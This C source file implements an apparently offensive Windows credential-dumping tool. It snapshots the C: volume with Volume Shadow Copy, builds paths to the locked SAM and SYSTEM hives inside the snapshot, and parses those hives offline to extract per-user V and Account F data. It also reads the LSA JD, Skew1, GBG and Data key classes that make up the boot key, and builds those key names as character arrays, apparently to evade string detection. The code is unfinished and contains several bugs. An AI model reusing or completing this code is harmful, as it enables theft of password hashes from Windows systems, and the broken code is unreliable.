// Peter Gabaldon. https://pgj11.com/.
// Perform a Shadow Snapshot to read SAM and SYSTEM
// from this newly created SS instead of reading them from the registry

// Using Offline Registry library, Offreg.dll, for parsing the Registry from the REGF-formatted SAM and SYSTEM files

// https://github.com/microsoft/Windows-classic-samples/blob/main/Samples/Win7Samples/winbase/vss/vshadow/shadow.cpp
// https://github.com/PeterUpfold/ShadowDuplicator
// https://learn.microsoft.com/en-us/windows/win32/vss/volume-shadow-copy-reference
// 
// Special mention to ShadowDuplicator from Peter Upfold because I took some much code from it to implement the shadow copy method and get SYSTEM and SAM from it
// https://github.com/PeterUpfold
// 
//#define _CRT_SECURE_NO_WARNINGS

#include <Windows.h>
#include <ntstatus.h>
#include <vss.h>
#include <vswriter.h>
#include <vsbackup.h>
#include <stdio.h>

#include "include/shadowMethod.h"
#include "include/main.h"
#include "include/offreg.h"

BOOL createSS() {
	HRESULT result;
	int strResult;
	BOOL resultRead;
	BYTE * SAM;
	BYTE * SYSTEM;
	DWORD numberBytesRead;
	DWORD fileSize;
	HANDLE file;
	IVssBackupComponents * backupComponents = NULL;
	IVssAsync * vssAsync = NULL;
	HRESULT asyncResult = E_FAIL;
	VSS_ID * snapshotSetId = NULL;
	VSS_ID * snapshotId = NULL;
	VSS_SNAPSHOT_PROP snapshotProp{};
	// For now, we presuppose C:

	// Not necessary right now. Later, when using args is better to use GetVolumePathNameW(); before GetVolumeNameForVolumeMountPointW 

	WCHAR volumeName[MAX_PATH] = {};
	if (!GetVolumeNameForVolumeMountPointW(L"C:\\", volumeName, MAX_PATH)) {
		return FALSE;
	}

	// Init COM
	result = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);

	if (result != S_OK) {
		exit(result);
	}
	
	result = CreateVssBackupComponents(&backupComponents);

	if (result != S_OK) {
		exit(result);
	}

	result = backupComponents->InitializeForBackup();

	if (result != S_OK) {
		exit(result);
	}

	result = backupComponents->GatherWriterMetadata(&vssAsync);

	if (result != S_OK) {
		exit(result);
	}

	while (asyncResult != VSS_S_ASYNC_CANCELLED && asyncResult != VSS_S_ASYNC_FINISHED) {
		Sleep(SLEEP_VSS_SYNC);
		result = vssAsync->QueryStatus(&asyncResult, NULL);
		if (result != S_OK) {
			vssAsync->Release();
			vssAsync = NULL;
		}
	}

	if (asyncResult == VSS_S_ASYNC_CANCELLED) {
		vssAsync->Release();
		vssAsync = NULL;
	}

	vssAsync->Release();
	vssAsync = NULL;

	asyncResult = E_FAIL;

	result = backupComponents->SetBackupState(false, false, VSS_BT_FULL, false);

	snapshotSetId = (VSS_ID*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(VSS_ID));

	result = backupComponents->StartSnapshotSet(snapshotSetId);

	// from StartSnapshotSet until backup completion, if we fail, we must call AbortBackup inside bail
	BOOL shouldAbortBackupOnBail = FALSE;

	snapshotId = (VSS_ID*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(VSS_ID));

	result = backupComponents->AddToSnapshotSet(volumeName, GUID_NULL, snapshotId);

	result = backupComponents->PrepareForBackup(&vssAsync);

	while (asyncResult != VSS_S_ASYNC_CANCELLED && asyncResult != VSS_S_ASYNC_FINISHED) {
		Sleep(SLEEP_VSS_SYNC);
		result = vssAsync->QueryStatus(&asyncResult, NULL);
		if (result != S_OK) {
			vssAsync->Release();
			vssAsync = NULL;
		}
	}

	if (asyncResult == VSS_S_ASYNC_CANCELLED) {
		vssAsync->Release();
		vssAsync = NULL;
	}

	asyncResult = E_FAIL;
	vssAsync->Release();
	vssAsync = NULL;

	// verify all VSS writers are in the correct state
	// TODO
	// VerifyWriterStatus();

	result = backupComponents->DoSnapshotSet(&vssAsync);

	while (asyncResult != VSS_S_ASYNC_CANCELLED && asyncResult != VSS_S_ASYNC_FINISHED) {
		Sleep(SLEEP_VSS_SYNC);
		result = vssAsync->QueryStatus(&asyncResult, NULL);
		if (result != S_OK) {
			vssAsync->Release();
			vssAsync = NULL;
		}
	}

	if (asyncResult == VSS_S_ASYNC_CANCELLED) {
		vssAsync->Release();
		vssAsync = NULL;
	}

	asyncResult = E_FAIL;
	vssAsync->Release();
	vssAsync = NULL;

	// verify all VSS writers are in the correct state
	// TODO
	// VerifyWriterStatus();

	result = backupComponents->GetSnapshotProperties(*snapshotId, &snapshotProp);

	// Perform the copy from SS

	// SAM
	WCHAR sourcePathFileSAM[MAX_PATH];
	strResult = swprintf(sourcePathFileSAM, MAX_PATH * sizeof(WCHAR), L"%s\\%s", snapshotProp.m_pwszSnapshotDeviceObject, L"Windows\\System32\\Config\\SAM");

	// SYSTEN
	WCHAR sourcePathFileSYSTEM[MAX_PATH];
	strResult = swprintf(sourcePathFileSYSTEM, MAX_PATH * sizeof(WCHAR), L"%s\\%s", snapshotProp.m_pwszSnapshotDeviceObject, L"Windows\\System32\\Config\\SYSTEM");

	// getSAMfromRegf()
}

void getSAMfromRegf(PSAM samRegEntries[], PULONG size, WCHAR SAMPath[MAX_PATH], WCHAR SYSTEMPath[MAX_PATH]) {
	ORHKEY subKeyUsers;
	ORHKEY subKeyAccount;
	ORHKEY subKeyUser;
	ULONG lengthBuff;
	DWORD numberSubkeysKey;
	DWORD numberValuesSubkeysV;
	DWORD numberValuesSubkeysF;
	WCHAR nameSubkeyKey[MAX_PATH] = {};
	WCHAR nameValueSubkeyV[MAX_PATH] = {};
	WCHAR nameValueSubkeyF[MAX_PATH] = {};
	DWORD maxLenOfNames;
	ULONG nEntries = 0;
	PSAM sams[MAX_SAM_ENTRIES] = {};
	ORHKEY samHive = NULL;

	// Some funcs need a pointer to a DWORD so cannot use macro
	DWORD lenRead = MAX_PATH;

	DWORD ret;

	ret = OROpenHive(SAMPath, &samHive);

	if (!NT_SUCCESS(ret)) {
		exit(ret);
	}

	// Open SAM\Domains\USers

	ret = OROpenKey(samHive, L"SAM", &subKeyUsers);

	if (!NT_SUCCESS(ret)) {
		exit(ret);
	}

	ret = OROpenKey(subKeyUsers, L"Domains", &subKeyUsers);

	if (!NT_SUCCESS(ret)) {
		exit(ret);
	}

	ret = OROpenKey(subKeyUsers, L"Users", &subKeyUsers);

	if (!NT_SUCCESS(ret)) {
		exit(ret);
	}

	// Open SAM\Domains\Account

	ret = OROpenKey(samHive, L"SAM", &subKeyAccount);

	if (!NT_SUCCESS(ret)) {
		exit(ret);
	}

	ret = OROpenKey(subKeyAccount, L"Domains", &subKeyAccount);

	if (!NT_SUCCESS(ret)) {
		exit(ret);
	}

	ret = OROpenKey(subKeyAccount, L"Account", &subKeyAccount);

	if (!NT_SUCCESS(ret)) {
		exit(ret);
	}


	ret = ORQueryInfoKey(subKeyUsers, NULL, NULL, &numberSubkeysKey, NULL, NULL, NULL, NULL, NULL, NULL, NULL);

	if (!NT_SUCCESS(ret)) {
		exit(ret);
	}


	for (ULONG i = 0; i < numberSubkeysKey && i < MAX_SAM_ENTRIES; i++) {
		maxLenOfNames = MAX_KEY_LENGTH;

		lenRead = MAX_PATH;
		ret = OREnumKey(subKeyUsers, i, nameSubkeyKey, &lenRead, NULL, NULL, NULL);

		if (!NT_SUCCESS(ret)) {
			exit(ret);
		}

		if (wcsncmp(L"00", nameSubkeyKey, wcslen(L"00")) == 0) {
			ret = OROpenKey(subKeyUsers, nameSubkeyKey, &subKeyUser);

			if (!NT_SUCCESS(ret)) {
				exit(ret);
			}

			ret = ORQueryInfoKey(subKeyUser, NULL, NULL, NULL, NULL, NULL, &numberValuesSubkeysV, NULL, NULL, NULL, NULL);

			if (!NT_SUCCESS(ret)) {
				exit(ret);
			}

			PSAM sam = (PSAM)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(SAMPath));
			wcscpy_s(sam->rid, wcslen(nameSubkeyKey), nameSubkeyKey);

			// TODO
			getClassesfromRegf(sam, SYSTEMPath);

			for (ULONG j = 0; j < numberValuesSubkeysV; j++) {
				lenRead = MAX_PATH;
				ret = OREnumValue(subKeyUser, j, nameValueSubkeyV, &lenRead, NULL, NULL, NULL);

				if (!NT_SUCCESS(ret)) {
					exit(ret);
				}

				if (wcsncmp(nameValueSubkeyV, L"V", wcslen(nameValueSubkeyV)) == 0) {
					lenRead = MAX_KEY_VALUE_LENGTH;
					ret = ORGetValue(subKeyUser, NULL, nameValueSubkeyV, NULL, sam->v, &lenRead);
					sam->vLen = lenRead;
				}
			}
			if (!NT_SUCCESS(ret)) {
				exit(ret);
			}

			ret = ORQueryInfoKey(subKeyAccount, NULL, NULL, NULL, NULL, NULL, &numberValuesSubkeysF, NULL, NULL, NULL, NULL);

			if (!NT_SUCCESS(ret)) {
				exit(ret);
			}

			for (ULONG j = 0; j < numberValuesSubkeysF; j++) {
				lenRead = MAX_PATH;
				ret = OREnumValue(subKeyAccount, j, nameValueSubkeyF, &lenRead, NULL, NULL, NULL);

				if (!NT_SUCCESS(ret)) {
					exit(ret);
				}

				if (wcsncmp(nameValueSubkeyF, L"F", wcslen(nameValueSubkeyF)) == 0) {
					lenRead = MAX_KEY_VALUE_LENGTH;
					ret = ORGetValue(subKeyAccount, NULL, nameValueSubkeyF, NULL, sam->v, &lenRead);
					sam->vLen = lenRead;
				}
			}

			sams[nEntries] = sam;
			nEntries++;
			ORCloseKey(subKeyUser);
			ORCloseKey(subKeyAccount);
		}
	}
	ORCloseKey(subKeyUsers);

	ULONG lenRet = nEntries * sizeof(SAMPath);
	CopyMemory(size, &lenRet, sizeof(ULONG));

	if (samRegEntries != NULL) {
		for (int i = 0; i < nEntries; i++) {
			samRegEntries[i] = sams[i];
			//HeapFree(GetProcessHeap(), 0, sams[i]);
		}
	}

	return;
}

void getClassesfromRegf(PSAM samRegEntry, WCHAR SYSTEMPath[MAX_PATH]) {
	WCHAR sJD[] = { L'J',L'D', L'\0' };
	WCHAR sSkew1[] = { L'S',L'k',L'e',L'w',L'1', L'\0' };
	WCHAR sGBG[] = { L'G',L'B',L'G', L'\0' };
	WCHAR sData[] = { L'D',L'a',L't',L'a', L'\0' };

	PWCHAR sAll[4] = { sJD, sSkew1, sGBG, sData };

	WCHAR resul[MAX_KEY_VALUE_LENGTH] = L"\0";
	WCHAR keyClass[MAX_KEY_VALUE_LENGTH] = {};
	ORHKEY systemHive = NULL;

	ORHKEY key;
	ORHKEY subKey;
	DWORD lenRead;

	DWORD ret;

	ret = OROpenHive(SYSTEMPath, &systemHive);

	if (!NT_SUCCESS(ret)) {
		exit(ret);
	}
	
	ret = OROpenKey(systemHive, L"CurrentControlSet", &key);

	if (!NT_SUCCESS(ret)) {
		exit(ret);
	}

	ret = OROpenKey(key, L"Control", &key);

	if (!NT_SUCCESS(ret)) {
		exit(ret);
	}

	ret = OROpenKey(key, L"Lsa", &key);

	if (!NT_SUCCESS(ret)) {
		exit(ret);
	}

	for (int j = 0; j < 4; j++) {
		WCHAR RegAux[MAX_PATH] = L"\0";

		ret = OROpenKey(key, sAll[j], &subKey);

		if (!NT_SUCCESS(ret)) {
			exit(ret);
		}

		ret = ORQueryInfoKey(subKey, keyClass, &lenRead, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);

		if (!NT_SUCCESS(ret)) {
			exit(ret);
		}

		wcsncat_s(resul, MAX_KEY_VALUE_LENGTH, keyClass, _TRUNCATE);

		ORCloseKey(key);
	}
	wcscpy_s(samRegEntry->classes, MAX_KEY_VALUE_LENGTH, resul);

	return;
}
